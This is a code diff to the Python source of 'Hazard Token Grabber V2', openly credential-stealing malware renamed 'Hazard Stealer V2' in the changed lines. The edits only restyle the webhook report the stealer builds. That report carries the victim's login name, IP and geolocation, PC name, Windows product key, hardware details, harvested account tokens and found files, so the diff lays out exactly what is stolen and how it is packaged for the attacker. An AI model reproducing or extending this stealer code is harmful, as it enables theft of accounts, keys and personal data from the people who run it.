@@ -431,10 +431,10 @@ class Hazard_Token_Grabber_V2(functions):
                             pass
                     with open(path, "w", encoding="utf-8") as f:
                         f.write(
-                            "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                            "🌟 Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                     with open(path, "a", encoding="utf-8") as fp:
                         fp.write(
-                            x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
+                            x+"\n\n🌟 Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
         w = self.getProductValues()
         wname = w[0]
         wkey = w[1]
@@ -473,7 +473,7 @@ class Hazard_Token_Grabber_V2(functions):
             'embeds': [
                 {
                     'author': {
-                        'name': f'*{os.getlogin()}* Just ran Hazard Token Grabber.V2',
+                        'name': f'**{os.getlogin()}** ran Hazard Stealer V2!',
                         'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
                         'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                     },
@@ -484,7 +484,7 @@ class Hazard_Token_Grabber_V2(functions):
                             'name': '\u200b',
                             'value': f'''```fix
                                 IP:᠎ {ip}
-                                Org:᠎ {org}
+                                ORG:᠎ {org}
                                 City:᠎ {city}
                                 Region:᠎ {region}
                                 Country:᠎ {country}```
@@ -494,33 +494,32 @@ class Hazard_Token_Grabber_V2(functions):
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                PCName: {os.getenv('COMPUTERNAME')}
-                                WinKey:᠎ {wkey}
+                                PC Name: {os.getenv('COMPUTERNAME')}
+                                Windows Key:᠎ {wkey}
                                 Platform:᠎ {wname}
-                                DiskSpace:᠎ {disk}GB
-                                Ram:᠎ {ram}GB```
+                                Disk Space:᠎ {disk}GB
+                                RAM:᠎ {ram}GB```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '**Tokens:**',
-                            'value': f'''```yaml
+                            'value': f'''```fix
                                 {tokens if tokens else "No tokens extracted"}``` 
                             '''.replace(' ', ''),
                             'inline': False
                         },
                         {
                             'name': fileCount,
-                            'value': f'''```ini
-                                [
+                            'value': f'''```fix
                                 {files_found.strip()}
-                                ]```
+                                ```
                             '''.replace(' ', ''),
                             'inline': False
                         }
                     ],
                     'footer': {
-                        'text': '🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'
+                        'text': '🌟 Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'
                     }
                 }
             ]
